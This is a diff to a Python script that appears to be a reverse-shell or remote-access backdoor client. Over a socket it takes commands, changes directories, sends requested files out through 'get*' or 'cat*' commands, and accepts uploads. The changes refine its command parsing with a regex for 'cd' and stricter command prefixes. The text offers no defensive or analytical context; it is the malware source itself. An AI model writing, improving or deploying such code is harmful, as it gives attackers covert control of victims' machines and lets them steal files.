@@ -1,6 +1,7 @@
 import socket
 import os
 import subprocess
+import re
 
 def transfer(s, filename):
     f = open(filename,"rb")
@@ -43,15 +44,16 @@ while True:
             s.send((os.getcwd() + ">").encode())
             s.send("Directory Changed...".encode())
         else:
-            os.chdir(temp[1])
+            res = re.findall("cd (.+)", res)
+            os.chdir(res[0])
             s.send((os.getcwd() + ">").encode())
             s.send("Directory Changed...".encode())
     elif res == "exit":
         break
-    elif 'get' in res or 'cat' in res:
+    elif 'get*' in res or 'cat*' in res:
         transfer(s, res.split("*")[1])
         continue
-    elif 'upload' in res:
+    elif 'upload*' in res:
         get(s, res.split("*")[2])
         continue
     else:
